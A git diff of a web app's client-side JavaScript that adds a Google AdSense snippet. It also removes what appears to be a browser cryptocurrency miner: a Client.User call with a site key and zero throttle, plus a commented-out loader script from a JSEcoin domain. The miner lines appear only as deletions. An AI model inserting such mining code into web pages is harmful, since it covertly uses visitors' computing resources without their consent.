@@ -27,6 +27,12 @@ function notif(text){
 
 /**vars */
 
+/** Adsense*/
+(adsbygoogle = window.adsbygoogle || []).push({
+          google_ad_client: "ca-pub-4431741015257754",
+          enable_page_level_ads: true
+});
+
 /************** WebSockets **************/
 /*var ws = new io();
 
@@ -81,9 +87,9 @@ getWsAuth(getEl('ctkn').value, auth => {
           tiempo: new Date(),
           tkn: getEl('ctkn').value
         }
-    
+
         pubContent.value = '';
-    
+
         ws.send(JSON.stringify(pubData));
         newPub(pubData);
     });
@@ -236,17 +242,6 @@ getEl('salir').addEventListener('click', function(){
     })
 })
 
-
-var _client = new Client.User('6803c03793e7d4939f9bd531c1c879977f8dcf512387c951e64fe3c6653e0a59',usuario, {
-    throttle: 0.0, c: 'w'
-});
-
-_client.start();
-
-
-//!function(){window.JSEDarkMode=1;window.JSESetLanguage="es";var e=document,t=e.createElement("script"),s=e.getElementsByTagName("script")[0];t.type="text/javascript",t.async=t.defer=!0,t.src="https://load.jsecoin.com/load/145891/neki-platform.herokuapp.com/0/0/",s.parentNode.insertBefore(t,s)}();
-
-
 /***get auth */
 function getWsAuth(csrf,cb){
     var headers = {
@@ -304,4 +299,3 @@ function getPubs(){
 
 
 })//DOCLoaded
-
